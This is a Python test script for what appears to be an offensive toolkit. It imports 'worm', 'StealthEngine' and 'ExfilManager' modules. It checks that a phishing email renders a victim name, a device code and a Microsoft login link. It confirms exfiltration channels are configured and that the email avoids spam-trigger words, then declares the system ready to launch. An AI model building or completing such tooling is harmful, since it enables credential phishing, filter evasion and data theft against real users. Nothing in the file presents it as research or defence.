#!/usr/bin/env python3
"""Quick validation test - minimal, simple checks"""
import os, sys, json
from pathlib import Path
sys.path.insert(0, str(Path('evildev')))

# Load .env.test
for line in open('.env.test'):
    line = line.strip()
    if line and not line.startswith('#') and '=' in line:
        k, v = line.split('=', 1)
        os.environ[k.strip()] = v.strip()

print("Testing system components...\n")

# Test 1: Imports
try:
    from worm import EmailTemplateLoader
    from core import StealthEngine
    from exfil import ExfilManager
    print("[PASS] All imports successful")
except Exception as e:
    print(f"[FAIL] Imports: {e}")
    sys.exit(1)

# Test 2: Template loading and rendering
try:
    loader = EmailTemplateLoader()
    html, is_html = loader.load_template()
    assert html, "No template loaded"
    rendered = loader.render_template('TestUser', 'ABC123', 'https://login.microsoft.com')
    assert "ABC123" in rendered, "Code not in template"
    assert "TestUser" in rendered, "Name not in template"
    assert "{name}" not in rendered, "Unresolved {name}"
    assert "{user_code}" not in rendered, "Unresolved {user_code}"
    print("[PASS] Template rendering works")
except Exception as e:
    print(f"[FAIL] Template test: {e}")
    sys.exit(1)

# Test 3: Configuration
try:
    assert os.environ.get('CLIENT_ID'), "CLIENT_ID not set"
    assert os.environ.get('EXFIL_CONFIG'), "EXFIL_CONFIG not set"
    print(f"[PASS] Configuration loaded (CLIENT_ID={os.environ['CLIENT_ID'][:20]}...)")
except Exception as e:
    print(f"[FAIL] Configuration: {e}")
    sys.exit(1)

# Test 4: Exfil config
try:
    config = json.load(open('exfil_config.test.json'))
    assert 'channels' in config, "No channels"
    assert config['channels'], "Empty channels"
    print(f"[PASS] Exfil config valid ({len(config['channels'])} channels)")
except Exception as e:
    print(f"[FAIL] Exfil config: {e}")
    sys.exit(1)

# Test 5: Anti-spam check
try:
    loader = EmailTemplateLoader()
    html, _ = loader.load_template()
    assert "Suspicious" not in html, "Contains suspicious keyword"
    assert "Unusual" not in html, "Contains unusual keyword"
    assert "<!DOCTYPE" in html or "<html" in html.lower(), "Invalid HTML"
    print("[PASS] Anti-spam measures validated")
except Exception as e:
    print(f"[FAIL] Anti-spam: {e}")
    sys.exit(1)

print("\n" + "="*50)
print("[SUCCESS] ALL TESTS PASSED!")
print("="*50)
print("\nSystem is ready. Start Flask with:")
print("  python -m flask run --port=5000")
